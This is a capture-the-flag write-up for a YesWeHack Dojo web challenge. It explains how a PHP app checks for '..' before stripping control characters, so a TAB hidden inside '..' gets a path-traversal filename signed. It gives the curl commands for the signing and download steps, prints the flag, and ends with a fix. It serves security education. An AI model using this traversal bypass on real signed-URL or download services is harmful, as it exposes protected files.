# YesWeHack-DOJO-CHALLENGE-50
# 🧩 YWH-DOJO-50 Write-up — Public Object Alpha

> **Category:** Web / File Read / Path Traversal  
> **Difficulty:** Easy → Medium  
> **Vulnerability:** Validate-before-normalize → Signed Path Traversal  
> **Technique:** Canonicalization mismatch using TAB injection

---

## 🎯 Challenge Goal

The challenge exposes several public objects:

```text
public/document_alpha.txt
public/document_beta.txt
public/document_gamma.txt
```

A hidden sensitive object is hinted at:

```text
public/super_secret.txt
```

The objective is to retrieve the secret file despite the signing restrictions.

---

## 🔍 Source Code Analysis

The vulnerable logic is inside the `sign` action:

```php
if (str_contains($filename, '..')) {
    $result = 'error';
    $error  = 'Forbidden chars in filename.';
}
```

The application blocks any direct use of:

```text
..
```

After validation, it sanitizes the filename:

```php
$file_path = sanitizeFilename($file_path);
```

with:

```php
function sanitizeFilename($filename) {
    return preg_replace('/[\x00-\x1F\x7F]/', '', $filename);
}
```

This removes all ASCII control characters, including:

- TAB (`\x09`)
- newline
- carriage return
- null byte

---

## 💥 Vulnerability

The root issue is the **wrong order of operations**:

```text
validate → sanitize → sign
```

Instead of the secure flow:

```text
sanitize → validate → sign
```

This introduces a **canonicalization mismatch** between:

- the string being validated
- the string actually signed

This is a classic **validate-before-normalize bug**.

---

## ⚔️ Exploitation Strategy

The bypass is to hide `..` using a **TAB character**.

### Signing payload

```text
public/.<TAB>./super_secret.txt
```

This visually becomes:

```text
public/.    ./super_secret.txt
```

The filter checks only for the exact substring:

```text
..
```

So the validation passes.

---

## 🧹 Why It Works

During signing, `sanitizeFilename()` removes the TAB.

So:

```text
public/.<TAB>./super_secret.txt
```

becomes:

```text
public/../super_secret.txt
```

The generated HMAC is therefore valid for the traversal path.

---

## 💻 Step 1 — Generate Signature

```bash
curl -X POST http://target/challenge.php \
  -d "action=sign" \
  --data-urlencode "filename=public/.%09./super_secret.txt"
```

### ✅ Expected Response

```json
{
  "file": "public/.%09./super_secret.txt",
  "expires": "1776081176",
  "signature": "kcNo2kB79o7uyHNg3cwQrVTD2i5xxprQEWwkig0BugM="
}
```

---

## 🖼️ Screenshot Placeholder — Signature Response

> _Insert screenshot of the successful `sign` response here_

```text
[ screenshot_sign_response.png ]
```

---

## 📥 Step 2 — Download Secret File

Now reuse the returned `signature` and `expires` with the normalized traversal path.

```bash
curl -X POST http://target/challenge.php \
  -d "action=download" \
  --data-urlencode "filename=public/../super_secret.txt" \
  -d "expires=1776081176" \
  --data-urlencode "signature=kcNo2kB79o7uyHNg3cwQrVTD2i5xxprQEWwkig0BugM="
```

---

## 🖼️ Screenshot Placeholder — Flag Retrieval

> _Insert screenshot of the download response with the flag_

```text
[ screenshot_flag_retrieval.png ]
```

---

## 🏁 Flag

```text
D0n7_l3t_M3_c0n7tr0l_F1l3n4m3!!
```

The flag itself hints directly at the core issue:

> Never let the user control unnormalized file paths.

---

## 🧠 Root Cause

The vulnerability is:

> **Path Traversal via Inconsistent Input Normalization**

More specifically:

> **Canonicalization mismatch between validation and signing**

The exact bug class is:

> **validate-before-normalize**

This flaw is common in:

- signed URLs
- CDN protected paths
- reverse proxies
- file gateways
- object storage access controls
- download APIs

---

## 🛡️ Secure Fix

The correct secure flow is:

```php
$filename = sanitizeFilename($filename);

if (str_contains($filename, '..')) {
    die("forbidden");
}
```

Even better, use filesystem canonicalization:

```php
$real = realpath(FILES_DIR . '/' . $filename);
$base = realpath(FILES_DIR);

if (!str_starts_with($real, $base)) {
    die("access denied");
}
```

This prevents traversal after real path resolution.

---

## 🎓 Lessons Learned

This challenge is an excellent reminder of a core secure coding rule:

> **Always normalize before validation**

This concept is essential in:

- Web Pentesting
- Bug Bounty
- API Security
- Secure Backend Development
- Cloud Storage Signed URLs

---

## ✅ Final Thoughts

A very elegant challenge that demonstrates how a tiny discrepancy in input handling can completely break path-based authorization.

The TAB injection trick is simple, realistic, and highly educational.

A great example of how **string validation without canonicalization awareness leads to exploitable security flaws**.
